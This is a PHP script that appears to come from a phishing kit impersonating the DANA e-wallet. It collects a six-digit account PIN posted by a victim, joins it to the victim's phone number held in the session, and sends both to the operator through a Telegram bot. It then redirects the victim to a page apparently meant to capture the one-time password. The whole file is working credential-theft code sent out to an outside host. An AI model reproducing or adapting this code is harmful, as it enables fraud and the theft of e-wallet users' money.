<?php
session_start();
include "./../telegram.php";

$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$_pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;

$phone_number        = $_SESSION['phoneNumber'];
$_SESSION['acc_pin'] = $_pin;

$message = "
──────────────────────
MR-GHELE DANA | PIN | ".$phone_number."
──────────────────────
• No HP : ".$phone_number."
• PIN AKUN : ".$_pin."
──────────────────────";

include "./function.php";

sendMessage($telegram_id, $message, $id_bot);
header('Location: ./../../dana_otp/');
?>
